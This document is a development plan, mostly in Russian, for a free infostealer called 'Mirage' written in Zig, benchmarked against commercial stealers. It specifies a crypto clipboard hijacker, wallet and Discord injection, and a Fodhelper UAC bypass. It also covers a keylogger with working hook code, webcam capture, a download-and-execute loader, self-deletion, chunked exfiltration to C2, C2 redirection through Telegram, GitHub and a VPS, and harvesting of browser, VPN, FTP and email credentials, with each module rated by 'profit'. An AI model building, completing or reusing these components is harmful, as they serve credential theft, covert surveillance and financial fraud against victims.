# Phase 10: Commercial Upgrade — Plan

## Сравнение с лидерами рынка

| Метрика | VoltaStealer | STORM | Ankari | **Mirage (сейчас)** | **Mirage (цель)** |
|---------|-------------|-------|--------|-------------------|-------------------|
| Язык | C + ASM | C++ (no std) | Rust | **Zig** | **Zig** |
| Вес | ~210 KB | ~460 KB | ? | **123 KB** | **<200 KB** |
| Браузеры | 100+ (dynamic) | Dynamic | Many | 46 (hardcoded) | **Dynamic** |
| Server-Side Decrypt | ❌ | **✅** | ❌ | ❌ | **✅** |
| Chunked Upload | ✅ | ✅ | ❌ | ❌ | **✅** |
| Clipper | ✅ 6 coins | ❌ | ❌ | ❌ | **✅ 11 coins** |
| Loader | ✅ | ✅ 10 files | ✅ DLL | ❌ | **✅** |
| Proxies (redirect) | ✅ TG/TON/Steam | ✅ Bridges VPS | ❌ | ❌ | **✅** |
| Self-delete | ✅ | ✅ | ✅ | ❌ | **✅** |
| Wallet Injection | ❌ | ❌ | ❌ | ❌ | **✅** |
| Discord Injection | ❌ | ❌ | ❌ | LevelDB only | **✅ + JS inject** |
| Keylogger | ❌ | ❌ | ❌ | ❌ | **✅** |
| Webcam | ❌ | ❌ | ❌ | ❌ | **✅** |
| VPN/Email/FTP | ❌ | **✅** | ❌ | ❌ | **✅** |
| UAC bypass | ❌ | ❌ | ❌ | ❌ | **✅ Fodhelper** |
| Price/month | $250-650 | Private | $70-150 | **Free** | **Free** |

## Источники кода

| Модуль | Референс | Файл |
|--------|----------|------|
| **Clipper** | Skuld | `modules/clipper/clipper.go` |
| **Discord Injection** | Skuld | `modules/discordinjection/injection.go` |
| **Wallet Injection** | Skuld | `modules/walletsinjection/walletsinjection.go` |
| **UAC Bypass** | Skuld + UACME | `modules/uacbypass/bypass.go` |
| **Self-Delete** | Skuld | `modules/startup/startup.go` |
| **Fake Error** | Skuld | `modules/fakeerror/fakeerror.go` |
| **Anti-Debug** | Skuld | `modules/antidebug/antidebug.go` |
| **Keylogger** | PhantomStealer / SentinelStealer | `Target.System/Keylogger.cs` |
| **Webcam** | PhantomStealer | `Target.System/WebcamScreenshot.cs` |
| **VPN/Email/FTP** | SentinelStealer | `Services/` |
| **Server-Side Processing** | STORM (concept) | — |
| **Прокладки** | VoltaStealer / STORM | — |

---

## 🔴 День 1: Clipper

### Источник
Skuld `modules/clipper/clipper.go` (34 строки)

### WinAPI
`user32!OpenClipboard`, `GetClipboardData(CF_TEXT)`, `SetClipboardData`, `CloseClipboard`

### Алгоритм
```
clipboard.Watch(ctx, clipboard.FmtText) → channel
  for each clipboard change:
    text = GetClipboardData()
    for each coin regex:
      if text matches regex AND attacker_address matches same regex:
        SetClipboardData(attacker_address)
```

### Поддерживаемые монеты (11)
BTC (Legacy `1|3|bc1` + SegWit `bc1q|bc1p`), ETH (`0x[0-9a-fA-F]{40}`), XMR, LTC, XLM, TRX, ADA, DASH, DOGE, SOL, TON

### Файлы
`src/clipper/clipper.zig`

### Сложность
Low — ~100 строк

---

## 🔴 День 1-3: Server-Side Processing

### Концепция (из STORM)
Билд НЕ открывает SQLite на машине жертвы. Вся расшифровка на сервере.

### На билде (Zig)
```
1. Собрать файлы: Login Data, Cookies, Web Data, History, Local State
2. Извлечь мастер-ключ из Local State  
3. Отправить сырые .db + ключ на сервер
```

### На сервере (C# Panel)
```
1. Получить .db файлы
2. Парсить SQLite через порт sqLoot на C#
3. Расшифровать AES-GCM через BCrypt (уже есть в Panel)
4. Сохранить в БД
```

### Файлы
`Panel/Services/ServerSideDecryptor.cs`

### Сложность
High — порт sqLoot на C#

---

## 🔴 День 2: Wallet Injection

### Источник
Skuld `modules/walletsinjection/walletsinjection.go` (97 строк)

### Цели
```
Atomic Wallet:   %LOCALAPPDATA%\Programs\atomic\resources\app.asar
Exodus:          %LOCALAPPDATA%\exodus\app-*\resources\app.asar
```

### Алгоритм
```
1. HTTP GET injection_url → malicious app.asar
2. NtCreateFile → NtWriteFile → overwrite original
3. License file ← webhook URL (для сбора данных от injected кода)
```

### Файлы
`src/wallets/wallet_inject.zig`

### Сложность
Medium — ~80 строк

---

## 🟡 День 3: Self-Delete + Loader

### Self-Delete
**Источник:** Skuld `modules/startup/startup.go`, Win11 24H2 fix

```zig
// Win10: MoveFileEx(exe, NULL, MOVEFILE_DELAY_UNTIL_REBOOT)
// Win11 24H2: FILE_DISPOSITION_INFORMATION with DeleteFile
// Fallback: cmd.exe /c ping 1.1.1.1 -n 1 -w 3000 & del {exe}
```

### Loader
**Источник:** VoltaStealer / STORM

```
POST /api/loader → [url1, url2, ..., url10]
for each url:
  HTTP GET → NtCreateFile → NtWriteFile
  .exe → CreateProcess(NO_WINDOW)
  .dll → LdrLoadDll
  .ps1 → powershell -exec bypass
```

### Файлы
`src/cleanup/self_delete.zig`, `src/loader/loader.zig`

### Сложность
Low-Medium

---

## 🟡 День 3: UAC Bypass

### Источник
Skuld `modules/uacbypass/bypass.go`, UACME #31

### Fodhelper техника
```zig
if (!IsUserAnAdmin()) {
    // HKCU\Software\Classes\ms-settings\shell\open\command
    // (Default) = путь к нашему exe
    // DelegateExecute = ""
    RegCreateKeyExW(...)
    RegSetValueExW(...)
    
    CreateProcess("fodhelper.exe", CREATE_NO_WINDOW)
    
    // Cleanup
    RegDeleteValueW(...)
}
```

### Файлы
`src/evasion/uac_bypass.zig`

### Сложность
Low — ~60 строк

---

## 🟡 День 4-5: Discord Injection

### Источник
Skuld `modules/discordinjection/injection.go` (169 строк)

### Три компонента

#### 1. InjectDiscord — JS injection
```
Desired path: %LOCALAPPDATA%\discord\app-*\modules\discord_desktop_core-*\discord_desktop_core\index.js

1. Glob find discord_desktop_core directory
2. HTTP GET injection.js (malicious JS with %WEBHOOK%)
3. Write as index.js
```

#### 2. BypassBetterDiscord
```
%APPDATA%\BetterDiscord\data\betterdiscord.asar
Replace "api/webhooks" → "ByHackirby" → invalidates other webhooks
```

#### 3. BypassTokenProtector
```
1. Kill DiscordTokenProtector.exe process
2. Delete: ProtectionPayload.dll, secure.dat
3. Rewrite config.json → disable all integrity checks
```

### Файлы
`src/messengers/discord_inject.zig`

### Сложность
Medium — ~170 строк

---

## 🟡 День 5-6: Keylogger

### Источник
SentinelStealer / PhantomStealer

### Техника
`SetWindowsHookEx(WH_KEYBOARD_LL)` — low-level keyboard hook

```zig
const WH_KEYBOARD_LL = 13;
const WM_KEYDOWN = 0x0100;

pub fn start() void {
    var hook = user32.SetWindowsHookExW(WH_KEYBOARD_LL, callback, hInstance, 0);
    var msg: MSG = undefined;
    while (user32.GetMessageW(&msg, null, 0, 0) > 0) {}
}

fn callback(code: i32, wparam: u32, lparam: i64) callconv(.stdcall) i32 {
    if (code >= 0 and wparam == WM_KEYDOWN) {
        const vk = @as(*KBDLLHOOKSTRUCT, @ptrCast(@alignCast(&lparam))).vkCode;
        logKey(vk);
    }
    return user32.CallNextHookEx(null, code, wparam, lparam);
}
```

### Файлы
`src/keylogger/keylogger.zig`

### Сложность
Medium — ~150 строк

---

## 🟡 День 6: Webcam

### Источник
PhantomStealer `WebcamScreenshot.cs`

### AVICAP32 техника
```csharp
capCreateCaptureWindowW("Webcam", WS_CHILD, 0, 0, 320, 240, hwnd, 1);
SendMessage(hCapWnd, WM_CAP_DRIVER_CONNECT, 0, 0);
SendMessage(hCapWnd, WM_CAP_EDIT_COPY, 0, 0);
OpenClipboard(hwnd) → GetClipboardData(CF_BITMAP) → SaveBMP();
SendMessage(hCapWnd, WM_CAP_DRIVER_DISCONNECT, 0, 0);
```

### Файлы
`src/system/webcam.zig`

### Сложность
Low — ~80 строк

---

## 🔵 День 7-8: VPN/Email/FTP

### Источник
SentinelStealer (огромная база путей)

### VPN (11)
NordVPN, OpenVPN, ProtonVPN, ExpressVPN, Surfshark, CyberGhost, PIA, Windscribe, TunnelBear, Hotspot Shield, VyprVPN

### FTP (8)
FileZilla, WinSCP, Total Commander, Far Manager, CuteFTP, SmartFTP, FlashFXP, CoreFTP

### Email (6)
Outlook, Thunderbird, Foxmail, eM Client, Windows Mail, Mailbird

Все — копирование конфигов по известным путям.

### Файлы
`src/vpn/vpn.zig`, `src/ftp/ftp.zig`, `src/email/email.zig`

### Сложность
Low — ~200 строк на все

---

## 🔵 День 8-9: Multi-thread + Chunked Upload

### Multi-thread
Fibers из EidosLoader: `ConvertThreadToFiber` + `CreateFiber` + `SwitchToFiber`

Каждый модуль сбора в своём fiber → параллельно.

### Chunked Upload (из Volta)
```zig
const CHUNK = 1024 * 1024; // 1MB
var offset: usize = 0;
while (offset < data.len) {
    const end = @min(offset + CHUNK, data.len);
    http.post("/api/log/chunk", data[offset..end]);
    offset = end;
}
http.post("/api/log/complete", &[_]u8{});
```

Если билд прерван — часть данных уже на сервере.

### Файлы
`src/network/chunked.zig`

### Сложность
Medium

---

## 🔵 День 9-10: Прокладки (Redirect)

### Уровни
**Level 1 — Telegram (как Volta):**
```
Билд → GET https://t.me/{channel}/{post_id} → парсим C2 из поста
```

**Level 2 — GitHub Releases:**
```
Билд → GET /repos/{user}/{repo}/releases → C2 в описании
```

**Level 3 — VPS Bridge (как STORM):**
```
Жертва → SSH tunnel → VPS → C2 сервер
```

### Файлы
`src/network/proxy.zig`

### Сложность
Medium

---

## 🔵 День 10: Динамический поиск браузеров

### Вместо хардкода 46 путей
```zig
1. Сканировать %LOCALAPPDATA% на папки с "User Data\Local State"
2. Читать Local State JSON → есть "os_crypt" → это браузер
3. Сканировать %APPDATA% на profiles.ini (Firefox/Gecko)
4. Найденные → извлечь все профили
```

Результат: **100+ браузеров** без обновления (как VoltaStealer).

### Файлы
`src/browsers/browser_scanner.zig`

### Сложность
Medium

---

## Итого

| # | Модуль | Дней | Профит | Сложность |
|---|--------|------|--------|-----------|
| 1 | Clipper | 1 | 💰💰💰💰💰 | Low |
| 2 | Server-Side Processing | 3 | 🛡️ stealth | **High** |
| 3 | Wallet Injection | 1 | 💰💰💰💰 | Medium |
| 4 | Self-Delete | 0.5 | 🛡️ opsec | Low |
| 5 | UAC Bypass | 0.5 | 🛡️ access | Low |
| 6 | Discord Injection | 2 | 💰💰💰 | Medium |
| 7 | Keylogger | 2 | 💰💰 | Medium |
| 8 | Webcam | 1 | 💰 | Low |
| 9 | VPN/Email/FTP | 2 | 💰💰💰 | Low |
| 10 | Multi-thread + Chunks | 2 | 🛡️ stealth | Medium |
| 11 | Прокладки | 1 | 🛡️ stealth | Medium |
| 12 | Dynamic Browser Scan | 1 | 📈 coverage | Medium |
| **Total** | **~17 days** | | |
